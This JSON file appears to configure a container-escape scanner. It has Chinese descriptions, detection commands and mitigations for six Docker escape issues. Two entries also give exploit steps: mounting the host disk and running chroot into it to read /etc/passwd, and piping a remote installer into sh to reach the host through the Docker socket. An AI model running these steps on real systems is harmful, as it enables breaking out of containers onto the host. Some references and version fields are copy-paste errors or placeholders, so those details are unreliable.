{
  "vuls": [
    {
      "id": 1,
      "name": "Docker 高危启动参数 - 特权模式启动容器",
      "type": "Docker escape",
      "description": "特权模式逃逸是一种最简单有效的逃逸方法。使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对宿主机的文件读写权限，进而可能通过chroot切换根目录，写入ssh公钥或计划任务等手段进行getshell。",
      "versions_affected": [
        "无"
      ],
      "severity": "Critical",
      "cvss_score": 0,
      "test_command": ["cat /proc/self/status | grep Cap"],
      "expected_output": "\\s+CapEff:\\s+00000[0-9a-f]ffffffffff\\s+",
      "steps_to_exploit": [
        "mkdir /test1",
        "ls /dev/sda* --->test1",
        "mount /dev/sda_ /test1",
        "chroot /test1 /bin/sh -c 'cat /etc/passwd'"
      ],
      "steps_to_verify": [
        "chroot /test1 /bin/sh -c 'ls /.dockerenv'"
      ],
      "verify_output":"No such file or directory",
      "last_step": [
        "umount -f /test1",
        "rm -r /test1"
      ],
      "mitigation": "禁止特权模式启动Docker",
      "references": [
        "https://example.com/cve-2024-xxxx",
        "https://exploit-db.com/exploits/xxxx"
      ]
    },
    {
      "id": 2,
      "name": "挂载Docker Socket逃逸",
      "type": "Docker escape",
      "description": "Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。",
      "versions_affected": [
        "无"
      ],
      "severity": "Critical",
      "cvss_score": 0,
      "test_command": ["ls /var/run/ | grep -qi docker.sock && echo \"Docker Socket is mounted.\" || echo \"Docker Socket is not mounted.\""],
      "expected_output": "Docker Socket is mounted.",
      "steps_to_exploit": [
        "apt-get update",
        "apt-get install curl -y",
        "curl -fsSL https://get.docker.com/ | sh",
        "docker run -it -v /:/test2 ubuntu /bin/bash",
        "chroot /test2 /bin/sh -c 'cat /etc/passwd'"
      ],
      "steps_to_verify": [
        "chroot /test2 /bin/sh -c 'ls /.dockerenv'"
      ],
      "verify_output":"No such file or directory",
      "last_step": [
        "umount -f /test2",
        "rm -r /test2"
      ],
      "mitigation": "禁止docker.socket挂载",
      "references": [
        "https://example.com/cve-2024-xxxx",
        "https://exploit-db.com/exploits/xxxx"
      ]
    },
    {
      "id": 3,
      "name": "挂载宿主机 procfs 逃逸",
      "type": "Docker escape",
      "description": "procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。 Docker默认情况下不会为容器开启 User Namespace 从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。",
      "versions_affected": [
        "无"
      ],
      "severity": "Critical",
      "cvss_score": 0,
      "test_command": ["find / -name core_pattern 2>/dev/null | wc -l | grep -q 2 && echo \"Procfs is mounted.\" || echo \"Procfs is not mounted.\""],
      "expected_output": "Procfs is mounted.",
      "steps_to_exploit": [
      ],
      "steps_to_verify": [
      ],
      "verify_output":"No such file or directory",
      "last_step": [
      ],
      "mitigation": "禁止挂载procfs到docker中",
      "references": [
        "https://example.com/cve-2024-xxxx",
        "https://exploit-db.com/exploits/xxxx"
      ]
    },
    {
      "id": 4,
      "name": "CVE-2024-21626",
      "type": "Docker escape",
      "description": "从公告讲就是 runc run 或者 runc exec 的过程中有存在没有及时关闭的 fd ，导致文件描述符泄漏在容器环境中，用户可以通过这个文件描述来进行容器逃逸。",
      "versions_affected": [
        "1.0.0-rc93<= RunC version <=1.1.11"
      ],
      "severity": "Critical",
      "cvss_score": 8.6,
      "test_command": ["cat ../../../../../../tmp/Container_runtime_scanner"],
      "expected_output": "Container_runtime_scanner_123456",
      "steps_to_exploit": [
      ],
      "steps_to_verify": [
      ],
      "verify_output":"",
      "last_step": [
      ],
      "mitigation": "升级docker版本",
      "references": [
        "https://nvd.nist.gov/vuln/detail/cve-2024-21626",
        "https://github.com/V0WKeep3r/CVE-2024-21626-runcPOC"
      ]
    },
    {
      "id": 5,
      "name": "CVE-2022-0492",
      "type": "Docker escape",
      "description": "该漏洞是由于control groups（cgroups）中的一个逻辑错误所致；cgroups是Linux的一个模块，同时也是容器的基本构建块。它是最容易利用的Linux权限提升漏洞之一：Linux内核错误地将特权操作暴露给非特权用户。",
      "versions_affected": [
        "~linux kernel 5.17-rc3"
      ],
      "severity": "Critical",
      "cvss_score": 7.8,
      "test_command": [
      "test_dir=/tmp/.cve-2022-0492-test\nmkdir -p $test_dir\nfor subsys in $(cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$'); do\n  if unshare -UrmC --propagation=unchanged bash -c \"mount -t cgroup -o $subsys cgroup $test_dir 2>/dev/null && test -w $test_dir/release_agent\" 2>/dev/null; then\n    echo \"CVE-2022-0492 vulnerability exists\"\n    break\n  fi\ndone\nrm -rf $test_dire"
      ],
      "expected_output": "CVE-2022-0492 vulnerability exists",
      "steps_to_exploit": [
      ],
      "steps_to_verify": [
      ],
      "verify_output":"",
      "last_step": [
      ],
      "mitigation": "升级docker版本",
      "references": [
        "https://nvd.nist.gov/vuln/detail/cve-2024-21626",
        "https://github.com/V0WKeep3r/CVE-2024-21626-runcPOC"
      ]
    },
    {
      "id": 6,
      "name": "CAP_SYS_MODULE逃逸",
      "type": "Docker escape",
      "description": "从 Linux 2.2 开始，Linux 将传统上与超级用户相关的权限划分为不同的单元，称为能力(capabilities)。 能力是每个线程的属性，可以独立启用或禁用。其中CAP_SYS_MODULE允许进程可以通过init_module()和delete_module()系统调用来加载和卸载内核模块。由于内核模块具有内核态命令执行权限，该能力是关键能力之一。",
      "versions_affected": [
        "~linux kernel 5.17-rc3"
      ],
      "severity": "Critical",
      "cvss_score": 7.8,
      "test_command": [
        "[ $((0x$(grep CapEff /proc/self/status | awk '{print $2}') & (1<<16))) -ne 0 ] && echo \"Has CAP_SYS_MODULE\" || echo \"No CAP_SYS_MODULE\""
      ],
      "expected_output": "Has CAP_SYS_MODULE",
      "steps_to_exploit": [
      ],
      "steps_to_verify": [
      ],
      "verify_output":"",
      "last_step": [
      ],
      "mitigation": "禁止添加CAP_SYS_MODULE逃逸权限",
      "references": [
        "https://nvd.nist.gov/vuln/detail/cve-2024-21626",
        "https://github.com/V0WKeep3r/CVE-2024-21626-runcPOC"
      ]
    }
  ]
}
